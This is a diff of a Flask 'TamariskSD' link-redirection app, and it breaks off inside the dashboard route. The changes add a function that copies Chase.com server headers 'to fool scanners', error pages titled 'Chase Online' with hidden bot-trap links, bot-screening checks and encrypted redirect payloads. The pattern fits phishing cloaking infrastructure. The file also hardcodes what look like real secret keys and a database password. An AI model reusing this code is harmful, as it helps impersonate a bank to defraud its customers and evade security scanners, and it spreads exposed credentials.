@@ -1,10 +1,11 @@
-from flask import Flask, request, redirect, render_template_string, abort, url_for, session, jsonify, make_response
+from flask import Flask, request, redirect, render_template_string, abort, url_for, session, jsonify, Response
 from flask_wtf import FlaskForm, CSRFProtect
 from wtforms import StringField, SubmitField, SelectField, BooleanField, HiddenField
 from wtforms.validators import DataRequired, Length, Regexp, URL
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.primitives import hashes, hmac
 from cryptography.hazmat.backends import default_backend
+import os
 import base64
 import json
 import re
@@ -13,7 +14,6 @@ import secrets
 import logging
 import time
 import random
-import math
 from datetime import datetime, timedelta
 import uuid
 import hashlib
@@ -21,22 +21,20 @@ from valkey import Valkey
 from functools import wraps
 import requests
 import bleach
-from ua_parser.user_agent_parser import Parse
-import sys
-import string
+from dotenv import load_dotenv
 
 app = Flask(__name__)
+load_dotenv()
 
 # Configure logging
 logging.basicConfig(
     level=logging.DEBUG,
     format='%(asctime)s - %(levelname)s - %(message)s',
-    handlers=[logging.StreamHandler(sys.stdout)]
+    handlers=[logging.StreamHandler()]
 )
 logger = logging.getLogger(__name__)
-logger.debug("Initializing Flask app")
 
-# Hardcoded configuration values
+# Configuration values
 FLASK_SECRET_KEY = "b8f9a3c2d7e4f1a9b0c3d6e8f2a7b4c9"
 WTF_CSRF_SECRET_KEY = "a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6"
 AES_GCM_KEY = b'\x1a\x2b\x3c\x4d\x5e\x6f\x70\x81\x92\xa3\xb4\xc5\xd6\xe7\xf8\x09\x1a\x2b\x3c\x4d\x5e\x6f\x70\x81\x92\xa3\xb4\xc5\xd6\xe7\xf8\x09'
@@ -46,12 +44,12 @@ VALKEY_PORT = 25534
 VALKEY_USERNAME = "default"
 VALKEY_PASSWORD = "AVNS_iypeRGpnvMGXCd4ayYL"
 DATA_RETENTION_DAYS = 90
-USER_TXT_URL = "https://raw.githubusercontent.com/anderlo091/nvclerks-flask/main/user.txt"
-REQUIRED_HEADERS = ['Accept', 'Connection']
-RISK_SCORE_THRESHOLD = 100
-COOKIE_TOKEN_TTL = 600  # 10 minutes
-VERIFY_TOKEN_TTL = 10  # 10 seconds
-MAX_PAYLOAD_PADDING = 32
+USER_TXT_URL = os.getenv("USER_TXT_URL", "https://raw.githubusercontent.com/anderlo091/nvclerks-flask/main/user.txt")
+
+# Key versioning for rotation
+KEY_VERSION = "1"  # Increment on manual key change
+PREVIOUS_AES_GCM_KEY = None  # Set to old key if rotation occurred
+PREVIOUS_HMAC_KEY = None     # Set to old key if rotation occurred
 
 # Verify keys at startup
 try:
@@ -117,15 +115,15 @@ class GenerateURLForm(FlaskForm):
         Regexp(r'^[A-Za-z0-9_@.]+$', message="Randomstring2 can only contain letters, numbers, _, @, or .")
     ])
     expiry = SelectField('Expiry', choices=[
-        ('300', '5 Minutes'),
         ('3600', '1 Hour'),
         ('86400', '1 Day'),
-        ('604800', '1 Week')
-    ], default='3600')
+        ('604800', '1 Week'),
+        ('2592000', '1 Month')
+    ], default='86400')
     analytics_enabled = BooleanField('Enable Analytics')
     submit = SubmitField('Generate URL')
 
-# Valkey initialization
+# Valkey initialization with fallback
 valkey_client = None
 try:
     valkey_client = Valkey(
@@ -152,264 +150,213 @@ def datetime_filter(timestamp):
 
 app.jinja_env.filters['datetime'] = datetime_filter
 
-# Add security headers
-def add_security_headers(response):
-    response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self' https://cdn.tailwindcss.com; style-src 'self' 'unsafe-inline'; img-src 'self'; connect-src 'self'"
-    response.headers['X-Content-Type-Options'] = 'nosniff'
-    response.headers['X-Frame-Options'] = 'DENY'
-    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
-    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
-    response.headers['X-Random-Token'] = secrets.token_hex(8)
-    response.headers['X-Session-ID'] = generate_random_string(16)
-    response.headers['Server'] = f"CustomServer/{secrets.token_hex(4)}"
-    return response
+# Encryption rotation and key management
+encryption_rotation = ['aes_gcm', 'hmac_sha256']
+encryption_index_key = "encryption_index"
+key_rotation_interval = 86400  # Rotate keys daily
 
-# Antibot utilities
-def calculate_request_entropy(headers, query_params):
-    entropy = 0
-    for value in list(headers.values()) + list(query_params.values()):
-        if value:
-            freq = {}
-            for char in value:
-                freq[char] = freq.get(char, 0) + 1
-            for count in freq.values():
-                prob = count / len(value)
-                entropy -= prob * math.log2(prob) if prob > 0 else 0
-    return entropy
+def rotate_keys():
+    global AES_GCM_KEY, HMAC_KEY, PREVIOUS_AES_GCM_KEY, PREVIOUS_HMAC_KEY
+    try:
+        if valkey_client:
+            last_rotation = valkey_client.get("key_rotation_timestamp")
+            current_time = int(time.time())
+            if not last_rotation or (current_time - int(last_rotation) > key_rotation_interval):
+                PREVIOUS_AES_GCM_KEY = AES_GCM_KEY
+                PREVIOUS_HMAC_KEY = HMAC_KEY
+                AES_GCM_KEY = secrets.token_bytes(32)
+                HMAC_KEY = secrets.token_bytes(32)
+                valkey_client.set("key_rotation_timestamp", current_time)
+                logger.debug("Encryption keys rotated successfully")
+    except Exception as e:
+        logger.error(f"Error rotating keys: {str(e)}")
 
-def generate_request_fingerprint():
-    headers = {k: v for k, v in request.headers.items() if k in REQUIRED_HEADERS}
-    timing = str(int(time.time() * 1000) % 10000)
-    return hashlib.sha256(f"{json.dumps(headers, sort_keys=True)}{timing}".encode()).hexdigest()
+def get_next_encryption_method():
+    try:
+        if valkey_client:
+            index = int(valkey_client.get(encryption_index_key) or 0)
+            valkey_client.set(encryption_index_key, (index + 1) % len(encryption_rotation))
+            return encryption_rotation[index % len(encryption_rotation)]
+        else:
+            return secrets.choice(encryption_rotation)
+    except Exception as e:
+        logger.error(f"Error in get_next_encryption_method: {str(e)}")
+        return 'aes_gcm'
 
-def is_suspicious_request():
-    risk_score = 0
-    ip = request.remote_addr
-    ua = request.headers.get('User-Agent', '').lower()
-    headers = request.headers
-    query_params = request.args
-
-    # User-Agent analysis
-    # Only flag highly suspicious User-Agents (e.g., scanners, malicious tools)
-    MALICIOUS_UA_PATTERNS = [
-        'scanner', 'curl', 'wget', 'python-requests', 'httpclient', 'zgrab',
-        'masscan', 'nmap', 'probe', 'sqlmap'
-    ]
-    if not ua:
-        logger.debug(f"No User-Agent provided, IP: {ip}")
-        risk_score += 30  # Reduced from 50 to allow some headless browsers
-    elif any(pattern in ua for pattern in MALICIOUS_UA_PATTERNS):
-        risk_score += 40  # Increased for malicious patterns
-        logger.debug(f"Suspicious User-Agent: {ua}")
-
-    # Allow known crawlers explicitly
-    KNOWN_CRAWLERS = ['googlebot', 'bingbot', 'yandexbot', 'baiduspider', 'duckduckbot']
-    if any(crawler in ua for crawler in KNOWN_CRAWLERS):
-        risk_score -= 20  # Reduce risk for legitimate crawlers
-        logger.debug(f"Known crawler detected: {ua}")
-
-    # Header validation
-    # Relax header checks to only flag missing critical headers
-    CRITICAL_HEADERS = ['Accept', 'Connection']
-    missing_headers = [h for h in CRITICAL_HEADERS if h not in headers]
-    if missing_headers:
-        risk_score += 10  # Reduced from 20
-        logger.debug(f"Missing headers: {missing_headers}")
-
-    # Entropy analysis
-    # Relax entropy threshold to avoid flagging normal requests
-    entropy = calculate_request_entropy(headers, query_params)
-    if entropy < 3:  # Changed from 5 to 3
-        risk_score += 15  # Reduced from 25
-        logger.debug(f"Low request entropy: {entropy}")
-
-    # Behavioral analysis (rapid requests)
-    if valkey_client:
-        request_key = f"requests:{ip}:link"
-        valkey_client.lpush(request_key, str(time.time()))
-        valkey_client.ltrim(request_key, 0, 9)  # Keep last 10 requests
-        valkey_client.expire(request_key, 20)
-        recent_requests = valkey_client.lrange(request_key, 0, -1)
-        if len(recent_requests) > 7:  # Increased from 5 to 7
-            timestamps = [float(t) for t in recent_requests]
-            if max(timestamps) - min(timestamps) < 10:  # Reduced from 15 to 10
-                risk_score += 50  # Increased to focus on rapid malicious requests
-                logger.debug(f"Rapid link access from IP: {ip}")
-
-    # Fingerprint analysis
-    # Relax fingerprint check to allow shared fingerprints
-    fingerprint = generate_request_fingerprint()
-    if valkey_client:
-        fingerprint_key = f"fingerprint:{fingerprint}"
-        valkey_client.sadd(fingerprint_key, ip)
-        valkey_client.expire(fingerprint_key, 3600)
-        if valkey_client.scard(fingerprint_key) > 5:  # Increased from 3 to 5
-            risk_score += 20  # Reduced from 30
-            logger.debug(f"Repeated fingerprint from IP: {ip}")
-
-    # Store risk score
-    if valkey_client:
-        try:
-            valkey_client.hincrby(f"risk_score:{ip}", "score", risk_score)
-            valkey_client.expire(f"risk_score:{ip}", 3600)
-        except Exception as e:
-            logger.warning(f"Failed to store risk score for IP {ip}: {str(e)}")
-
-    # Only block if risk score is very high
-    if risk_score >= RISK_SCORE_THRESHOLD:
-        logger.warning(f"Blocked highly suspicious request from {ip}: risk_score={risk_score}")
-        # Return 403 Forbidden instead of redirecting to Google
-        response = make_response(render_template_string("""
-            <!DOCTYPE html>
-            <html lang="en">
-            <head>
-                <meta charset="UTF-8">
-                <meta name="viewport" content="width=device-width, initial-scale=1.0">
-                <meta name="robots" content="noindex, nofollow">
-                <title>Access Denied - TamariskSD</title>
-                <script src="https://cdn.tailwindcss.com"></script>
-            </head>
-            <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
-                <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
-                    <h3 class="text-lg font-bold mb-4 text-red-600">Access Denied</h3>
-                    <p class="text-gray-600">Your request was blocked due to suspicious activity.</p>
-                </div>
-            </body>
-            </html>
-        """), 403)
-        return add_security_headers(response)
-
-    logger.debug(f"Request allowed, risk_score={risk_score}, IP: {ip}")
-    return None
-
-# Rate limiting
-def dynamic_rate_limit(base_limit=5, base_per=60):
+def rate_limit(limit=5, per=60):
     def decorator(f):
         @wraps(f)
         def wrapped_function(*args, **kwargs):
-            # Check for suspicious requests
-            result = is_suspicious_request()
-            if result:
-                return result
-
-            ip = request.remote_addr
-            if not valkey_client:
-                logger.warning("Valkey unavailable, skipping rate limit")
-                response = make_response(f(*args, **kwargs))
-                return add_security_headers(response)
-            
-            risk_score = int(valkey_client.hget(f"risk_score:{ip}", "score") or 0)
-            limit = max(1, base_limit - (risk_score // 20))
-            per = random.randint(base_per - 10, base_per + 10)
-            key = f"rate_limit:{ip}:{f.__name__}:{secrets.token_hex(4)}"
             try:
+                ip = request.remote_addr
+                if not valkey_client:
+                    logger.warning("Valkey unavailable, skipping rate limit")
+                    return f(*args, **kwargs)
+                key = f"rate_limit:{ip}:{f.__name__}"
                 current = valkey_client.get(key)
                 if current is None:
                     valkey_client.setex(key, per, 1)
                     logger.debug(f"Rate limit set for {ip}: 1/{limit}")
                 elif int(current) >= limit:
-                    logger.warning(f"Rate limit exceeded for IP: {ip}, risk_score: {risk_score}")
-                    response = make_response(render_template_string("""
-                        <!DOCTYPE html>
-                        <html lang="en">
-                        <head>
-                            <meta charset="UTF-8">
-                            <meta name="viewport" content="width=device-width, initial-scale=1.0">
-                            <meta name="robots" content="noindex, nofollow">
-                            <meta name="description" content="Secure URL redirection service for managing custom links">
-                            <meta name="keywords" content="URL redirection, secure links, link management, URL shortening">
-                            <meta name="author" content="TamariskSD">
-                            <meta http-equiv="X-UA-Compatible" content="IE=edge">
-                            <meta name="referrer" content="strict-origin-when-cross-origin">
-                            <meta property="og:title" content="TamariskSD - Too Many Requests">
-                            <meta property="og:description" content="Secure URL redirection service for managing custom links">
-                            <meta property="og:type" content="website">
-                            <meta property="og:url" content="{{ request.url }}">
-                            <title>Too Many Requests - TamariskSD</title>
-                            <script src="https://cdn.tailwindcss.com"></script>
-                        </head>
-                        <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
-                            <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
-                                <h3 class="text-lg font-bold mb-4 text-red-600">Too Many Requests</h3>
-                                <p class="text-gray-600">Please try again later.</p>
-                            </div>
-                        </body>
-                        </html>
-                    """, request=request), 429)
-                    return add_security_headers(response)
+                    logger.warning(f"Rate limit exceeded for IP: {ip}")
+                    abort(429, "Too Many Requests")
                 else:
                     valkey_client.incr(key)
                     logger.debug(f"Rate limit incremented for {ip}: {int(current)+1}/{limit}")
-                response = make_response(f(*args, **kwargs))
-                return add_security_headers(response)
+                return f(*args, **kwargs)
             except Exception as e:
-                logger.error(f"Error in rate_limit for IP {ip}: {str(e)}")
-                response = make_response(f(*args, **kwargs))
-                return add_security_headers(response)
+                logger.error(f"Error in rate_limit for IP {ip}: {str(e)}", exc_info=True)
+                return f(*args, **kwargs)
         return wrapped_function
     return decorator
 
-# Payload encryption and obfuscation
-def encrypt_payload(payload):
+def encrypt_aes_gcm(payload, key=AES_GCM_KEY):
     try:
-        payload_bytes = json.dumps({
-            "data": payload,
-            "decoy": secrets.token_hex(16),
-            "timestamp": int(time.time())
-        }).encode('utf-8')
-        padding_length = random.randint(8, MAX_PAYLOAD_PADDING)
-        padding = secrets.token_bytes(padding_length)
-        padded_payload = len(padding).to_bytes(4, 'big') + payload_bytes + padding
-        b64_payload = base64.urlsafe_b64encode(padded_payload)
         iv = secrets.token_bytes(12)
-        cipher = Cipher(algorithms.AES(AES_GCM_KEY), modes.GCM(iv), backend=default_backend())
+        cipher = Cipher(algorithms.AES(key), modes.GCM(iv), backend=default_backend())
         encryptor = cipher.encryptor()
-        ciphertext = encryptor.update(b64_payload) + encryptor.finalize()
+        data = payload.encode('utf-8')
+        ciphertext = encryptor.update(data) + encryptor.finalize()
         encrypted = iv + ciphertext + encryptor.tag
-        h = hmac.HMAC(HMAC_KEY, hashes.SHA256(), backend=default_backend())
-        h.update(encrypted)
-        signature = h.finalize()
-        result = f"{base64.urlsafe_b64encode(encrypted).decode()}.{base64.urlsafe_b64encode(signature).decode()}"
-        logger.debug(f"Encrypted payload: {result[:20]}...")
+        result = base64.urlsafe_b64encode(encrypted).decode('utf-8')
+        logger.debug(f"AES-GCM encrypted payload: {result[:20]}... (length: {len(result)})")
         return result
     except Exception as e:
-        logger.error(f"Payload encryption error: {str(e)}", exc_info=True)
+        logger.error(f"AES-GCM encryption error: {str(e)}", exc_info=True)
         raise ValueError(f"Encryption failed: {str(e)}")
 
-def decrypt_payload(encrypted):
+def decrypt_aes_gcm(encrypted, key=AES_GCM_KEY):
     try:
-        parts = encrypted.split('.')
-        if len(parts) != 2:
-            raise ValueError("Invalid payload format")
-        encrypted_data = base64.urlsafe_b64decode(parts[0])
-        signature = base64.urlsafe_b64decode(parts[1])
-        h = hmac.HMAC(HMAC_KEY, hashes.SHA256(), backend=default_backend())
-        h.update(encrypted_data)
-        h.verify(signature)
+        encrypted_data = base64.urlsafe_b64decode(encrypted)
         iv = encrypted_data[:12]
         tag = encrypted_data[-16:]
         ciphertext = encrypted_data[12:-16]
-        cipher = Cipher(algorithms.AES(AES_GCM_KEY), modes.GCM(iv, tag), backend=default_backend())
+        cipher = Cipher(algorithms.AES(key), modes.GCM(iv, tag), backend=default_backend())
         decryptor = cipher.decryptor()
-        b64_payload = decryptor.update(ciphertext) + decryptor.finalize()
-        padded_payload = base64.urlsafe_b64decode(b64_payload)
-        if len(padded_payload) < 4:
-            raise ValueError("Invalid payload: too short")
-        padding_length = int.from_bytes(padded_payload[:4], 'big')
-        if padding_length > MAX_PAYLOAD_PADDING or len(padded_payload) < 4 + padding_length:
-            raise ValueError("Invalid padding length")
-        payload_bytes = padded_payload[4:-padding_length]
-        payload_json = json.loads(payload_bytes.decode('utf-8'))
-        result = payload_json['data']
-        logger.debug(f"Decrypted payload: {result[:50]}...")
+        decrypted = decryptor.update(ciphertext) + decryptor.finalize()
+        result = decrypted.decode('utf-8')
+        logger.debug(f"AES-GCM decrypted payload: {result[:50]}...")
         return result
     except Exception as e:
-        logger.error(f"Payload decryption error: {str(e)}", exc_info=True)
+        logger.error(f"AES-GCM decryption error: {str(e)}", exc_info=True)
+        raise ValueError(f"Decryption failed: {str(e)}")
+
+def encrypt_hmac_sha256(payload, key=HMAC_KEY):
+    try:
+        data = payload.encode('utf-8')
+        h = hmac.HMAC(key, hashes.SHA256(), backend=default_backend())
+        h.update(data)
+        signature = h.finalize()
+        result = f"{base64.urlsafe_b64encode(data).decode('utf-8')}.{base64.urlsafe_b64encode(signature).decode('utf-8')}"
+        logger.debug(f"HMAC-SHA256 encrypted payload: {result[:20]}... (length: {len(result)})")
+        return result
+    except Exception as e:
+        logger.error(f"HMAC-SHA256 encryption error: {str(e)}", exc_info=True)
+        raise ValueError(f"Encryption failed: {str(e)}")
+
+def decrypt_hmac_sha256(encrypted, key=HMAC_KEY):
+    try:
+        data_b64, sig_b64 = encrypted.split('.')
+        data = base64.urlsafe_b64decode(data_b64)
+        signature = base64.urlsafe_b64decode(sig_b64)
+        h = hmac.HMAC(key, hashes.SHA256(), backend=default_backend())
+        h.update(data)
+        h.verify(signature)
+        result = data.decode('utf-8')
+        logger.debug(f"HMAC-SHA256 decrypted payload: {result[:50]}...")
+        return result
+    except Exception as e:
+        logger.error(f"HMAC-SHA256 decryption error: {str(e)}", exc_info=True)
         raise ValueError(f"Decryption failed: {str(e)}")
 
 def generate_random_string(length):
-    characters = string.ascii_letters + string.digits + '-_'
-    return ''.join(secrets.choice(characters) for _ in range(length))
+    try:
+        characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_"
+        result = "".join(secrets.choice(characters) for _ in range(length))
+        logger.debug(f"Generated random string: {result[:10]}... (length: {len(result)})")
+        return result
+    except Exception as e:
+        logger.error(f"Error generating random string: {str(e)}", exc_info=True)
+        return secrets.token_urlsafe(length)
+
+def get_base_domain():
+    try:
+        host = request.host
+        logger.debug(f"Processing host: {host}")
+        parts = host.split('.')
+        if len(parts) >= 2:
+            base_domain = '.'.join(parts[-2:])
+            logger.debug(f"Base domain extracted: {base_domain}")
+            return base_domain
+        logger.warning(f"Invalid host format, returning default: {host}")
+        return host
+    except Exception as e:
+        logger.error(f"Error getting base domain: {str(e)}")
+        return "qinjack.com"
+
+def mimic_chase_response():
+    """Mimic Chase.com server headers to fool scanners."""
+    headers = {
+        'Server': 'AkamaiGHost',
+        'Content-Type': 'text/html; charset=UTF-8',
+        'X-Frame-Options': 'SAMEORIGIN',
+        'X-XSS-Protection': '1; mode=block',
+        'X-Content-Type-Options': 'nosniff',
+        'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
+        'Cache-Control': 'no-store, no-cache, must-revalidate',
+        'Pragma': 'no-cache',
+        'Expires': '0'
+    }
+    logger.debug("Generated Chase.com-like headers")
+    return headers
+
+def check_behavior(ip):
+    """Analyze request behavior to detect bots with stricter checks."""
+    try:
+        if not valkey_client:
+            logger.warning("Valkey unavailable, skipping behavior check")
+            return True
+        session_key = f"behavior:{ip}"
+        headers = request.headers
+        current_time = time.time()
+        behavior_data = valkey_client.get(session_key)
+        if behavior_data:
+            data = json.loads(behavior_data)
+            data['requests'].append({
+                'time': current_time,
+                'user_agent': headers.get('User-Agent', ''),
+                'accept': headers.get('Accept', ''),
+                'referer': headers.get('Referer', ''),
+                'accept_language': headers.get('Accept-Language', ''),
+                'connection': headers.get('Connection', '')
+            })
+            if len(data['requests']) > 10:
+                data['requests'] = data['requests'][-10:]  # Keep last 10 requests
+            intervals = [data['requests'][i+1]['time'] - data['requests'][i]['time'] for i in range(len(data['requests'])-1)]
+            # Stricter checks: rapid requests, multiple User-Agents, or missing browser headers
+            if intervals and (min(intervals) < 0.05 or 
+                             len(set([r['user_agent'] for r in data['requests']])) > 2 or
+                             not any(h in headers.get('Accept', '') for h in ['text/html', 'application/xhtml+xml']) or
+                             not headers.get('Accept-Language')):
+                logger.warning(f"Suspicious behavior detected for IP {ip}: intervals={intervals}, user_agents={len(set([r['user_agent'] for r in data['requests']]))}")
+                return False
+            valkey_client.setex(session_key, 3600, json.dumps(data))
+        else:
+            valkey_client.setex(session_key, 3600, json.dumps({
+                'requests': [{
+                    'time': current_time,
+                    'user_agent': headers.get('User-Agent', ''),
+                    'accept': headers.get('Accept', ''),
+                    'referer': headers.get('Referer', ''),
+                    'accept_language': headers.get('Accept-Language', ''),
+                    'connection': headers.get('Connection', '')
+                }]
+            }))
+        logger.debug(f"Behavior check passed for IP {ip}")
+        return True
+    except Exception as e:
+        logger.error(f"Error checking behavior for IP {ip}: {str(e)}")
+        return True
 
 def get_valid_usernames():
     try:
@@ -418,44 +365,40 @@ def get_valid_usernames():
             if cached:
                 logger.debug("Retrieved usernames from Valkey cache")
                 return json.loads(cached)
-        response = requests.get(USER_TXT_URL, timeout=5)
+        response = requests.get(USER_TXT_URL)
         response.raise_for_status()
         usernames = [bleach.clean(line.strip()) for line in response.text.splitlines() if line.strip()]
         if valkey_client:
-            valkey_client.setex("usernames", 3600, json.dumps(usernames))
-            logger.debug("Cached usernames in Valkey")
-        logger.debug(f"Fetched {len(usernames)} usernames")
+            try:
+                valkey_client.setex("usernames", 3600, json.dumps(usernames))
+                logger.debug("Cached usernames in Valkey")
+            except Exception as e:
+                logger.error(f"Valkey error caching usernames: {str(e)}")
+        logger.debug(f"Fetched {len(usernames)} usernames from GitHub")
         return usernames
     except Exception as e:
-        logger.error(f"Error fetching usernames: {str(e)}")
+        logger.error(f"Error fetching user.txt: {str(e)}", exc_info=True)
         return []
 
 def login_required(f):
     @wraps(f)
     def decorated_function(*args, **kwargs):
-        if 'username' not in session:
-            logger.debug(f"Redirecting to login from {request.url}")
-            response = make_response(redirect(url_for('login', next=request.url)))
-            return add_security_headers(response)
-        logger.debug(f"Authenticated user: {session['username']}")
-        response = make_response(f(*args, **kwargs))
-        return add_security_headers(response)
+        try:
+            if 'username' not in session:
+                logger.debug(f"Redirecting to login from {request.url}, session: {session}")
+                return redirect(url_for('login', next=request.url))
+            logger.debug(f"Authenticated user: {session['username']}, session: {session}")
+            return f(*args, **kwargs)
+        except Exception as e:
+            logger.error(f"Error in login_required: {str(e)}", exc_info=True)
+            return redirect(url_for('login'))
     return decorated_function
 
-def get_base_domain():
-    try:
-        host = request.host
-        parts = host.split('.')
-        return '.'.join(parts[-2:]) if len(parts) >= 2 else host
-    except Exception as e:
-        logger.error(f"Error getting base domain: {str(e)}")
-        return "tamarisksd.com"
-
 @app.route("/login", methods=["GET", "POST"])
-@dynamic_rate_limit(base_limit=5, base_per=60)
+@rate_limit(limit=5, per=60)
 def login():
     try:
-        logger.debug(f"Accessing /login, method: {request.method}, next: {request.args.get('next', '')}")
+        logger.debug(f"Accessing /login, method: {request.method}, next: {request.args.get('next', '')}, session: {session}")
         form = LoginForm()
         if form.validate_on_submit():
             username = bleach.clean(form.username.data.strip())
@@ -465,41 +408,32 @@ def login():
                 session['username'] = username
                 session.permanent = True
                 session.modified = True
-                logger.debug(f"User {username} logged in")
+                logger.debug(f"User {username} logged in, session: {session}")
                 next_url = form.next_url.data or url_for('dashboard')
-                response = make_response(redirect(next_url))
-                return add_security_headers(response)
+                logger.debug(f"Redirecting to {next_url}")
+                return redirect(next_url)
             logger.warning(f"Invalid login attempt: {username}")
             form.username.errors.append("Invalid username")
-        response = make_response(render_template_string("""
+        return render_template_string("""
             <!DOCTYPE html>
             <html lang="en">
             <head>
                 <meta charset="UTF-8">
                 <meta name="viewport" content="width=device-width, initial-scale=1.0">
                 <meta name="robots" content="noindex, nofollow">
-                <meta name="description" content="Secure URL redirection service login">
-                <meta name="keywords" content="URL redirection, secure links, login, authentication, URL management">
-                <meta name="author" content="TamariskSD">
-                <meta http-equiv="X-UA-Compatible" content="IE=edge">
-                <meta name="referrer" content="strict-origin-when-cross-origin">
-                <meta property="og:title" content="TamariskSD - Login">
-                <meta property="og:description" content="Log in to manage your secure URL redirects">
-                <meta property="og:type" content="website">
-                <meta property="og:url" content="{{ request.url }}">
-                <title>Login - TamariskSD</title>
+                <title>Login</title>
                 <script src="https://cdn.tailwindcss.com"></script>
                 <style>
-                    body { background: linear-gradient(to bottom, #252423, #6264a7); color: #ffffff; }
+                    body { background: linear-gradient(to right, #4f46e5, #7c3aed); }
                     .container { animation: fadeIn 1s ease-in; }
                     @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
                 </style>
             </head>
             <body class="min-h-screen flex items-center justify-center p-4">
-                <div class="container w-full max-w-md mx-auto text-center">
-                    <h1 class="text-3xl font-extrabold mb-6 text-white">Login</h1>
+                <div class="container bg-white p-8 rounded-xl shadow-2xl max-w-md w-full">
+                    <h1 class="text-3xl font-extrabold mb-6 text-center text-gray-900">Login</h1>
                     {% if form.errors %}
-                        <p class="text-red-400 mb-4">
+                        <p class="text-red-600 mb-4 text-center">
                             {% for field, errors in form.errors.items() %}
                                 {% for error in errors %}
                                     {{ error }}<br>
@@ -511,100 +445,62 @@ def login():
                         {{ form.csrf_token }}
                         {{ form.next_url(value=request.args.get('next', '')) }}
                         <div>
-                            <label class="block text-sm font-medium text-white">Username</label>
-                            {{ form.username(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition bg-gray-800 text-white border-gray-600") }}
+                            <label class="block text-sm font-medium text-gray-700">Username</label>
+                            {{ form.username(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition") }}
                         </div>
                         {{ form.submit(class="w-full bg-indigo-600 text-white p-3 rounded-lg hover:bg-indigo-700 transition") }}
                     </form>
+                    <a href="/bot-trap" style="display:none;">Bot Trap</a>
                 </div>
             </body>
             </html>
-        """, form=form, request=request))
-        return add_security_headers(response)
+        """, form=form)
     except Exception as e:
         logger.error(f"Error in login: {str(e)}", exc_info=True)
-        response = make_response(render_template_string("""
-            <!DOCTYPE html>
-            <html lang="en">
-            <head>
-                <meta charset="UTF-8">
-                <meta name="viewport" content="width=device-width, initial-scale=1.0">
-                <meta name="robots" content="noindex, nofollow">
-                <meta name="description" content="Secure URL redirection service for managing custom links">
-                <meta name="keywords" content="URL redirection, secure links, link management, URL shortening">
-                <meta name="author" content="TamariskSD">
-                <meta http-equiv="X-UA-Compatible" content="IE=edge">
-                <meta name="referrer" content="strict-origin-when-cross-origin">
-                <meta property="og:title" content="TamariskSD - Error">
-                <meta property="og:description" content="An error occurred while accessing the URL redirection service">
-                <meta property="og:type" content="website">
-                <meta property="og:url" content="{{ request.url }}">
-                <title>Internal Server Error - TamariskSD</title>
-                <script src="https://cdn.tailwindcss.com"></script>
-            </head>
-            <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
-                <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
-                    <h3 class="text-lg font-bold mb-4 text-red-600">Internal Server Error</h3>
-                    <p class="text-gray-600">Something went wrong. Please try again later.</p>
-                </div>
-            </body>
-            </html>
-        """, request=request), 500)
-        return add_security_headers(response)
+        headers = mimic_chase_response()
+        return Response(
+            "<html><head><title>Chase Online</title></head><body>Internal Server Error<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
+            status=500,
+            headers=headers
+        )
 
 @app.route("/", methods=["GET"])
-@dynamic_rate_limit(base_limit=5, base_per=60)
+@rate_limit(limit=5, per=60)
 def index():
     try:
-        logger.debug(f"Accessing root URL, host: {request.host}")
+        logger.debug(f"Accessing root URL, session: {'username' in session}, host: {request.host}, url: {request.url}")
         if 'username' in session:
-            response = make_response(redirect(url_for('dashboard')))
-            return add_security_headers(response)
-        response = make_response(redirect(url_for('login')))
-        return add_security_headers(response)
+            logger.debug(f"User {session['username']} redirecting to dashboard")
+            return redirect(url_for('dashboard'))
+        logger.debug("No user session, redirecting to login")
+        return redirect(url_for('login'))
     except Exception as e:
         logger.error(f"Error in index: {str(e)}", exc_info=True)
-        response = make_response(render_template_string("""
-            <!DOCTYPE html>
-            <html lang="en">
-            <head>
-                <meta charset="UTF-8">
-                <meta name="viewport" content="width=device-width, initial-scale=1.0">
-                <meta name="robots" content="noindex, nofollow">
-                <meta name="description" content="Secure URL redirection service for managing custom links">
-                <meta name="keywords" content="URL redirection, secure links, link management, URL shortening">
-                <meta name="author" content="TamariskSD">
-                <meta http-equiv="X-UA-Compatible" content="IE=edge">
-                <meta name="referrer" content="strict-origin-when-cross-origin">
-                <meta property="og:title" content="TamariskSD - Error">
-                <meta property="og:description" content="An error occurred while accessing the URL redirection service">
-                <meta property="og:type" content="website">
-                <meta property="og:url" content="{{ request.url }}">
-                <title>Internal Server Error - TamariskSD</title>
-                <script src="https://cdn.tailwindcss.com"></script>
-            </head>
-            <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
-                <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
-                    <h3 class="text-lg font-bold mb-4 text-red-600">Internal Server Error</h3>
-                    <p class="text-gray-600">Something went wrong. Please try again later.</p>
-                </div>
-            </body>
-            </html>
-        """, request=request), 500)
-        return add_security_headers(response)
+        headers = mimic_chase_response()
+        return Response(
+            "<html><head><title>Chase Online</title></head><body>Internal Server Error<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
+            status=500,
+            headers=headers
+        )
 
 @app.route("/dashboard", methods=["GET", "POST"])
 @login_required
-@dynamic_rate_limit(base_limit=5, base_per=60)
+@rate_limit(limit=5, per=60)
 def dashboard():
     try:
+        if 'username' not in session:
+            logger.error("Session missing username, redirecting to login")
+            return redirect(url_for('login'))
         username = session['username']
-        logger.debug(f"Accessing dashboard for user: {username}")
+        logger.debug(f"Accessing dashboard for user: {username}, session: {session}")
+
+        rotate_keys()  # Rotate encryption keys if needed
         base_domain = get_base_domain()
         form = GenerateURLForm()
         error = None
 
         if form.validate_on_submit():
+            logger.debug(f"Processing form data: {form.data}")
             subdomain = bleach.clean(form.subdomain.data.strip())
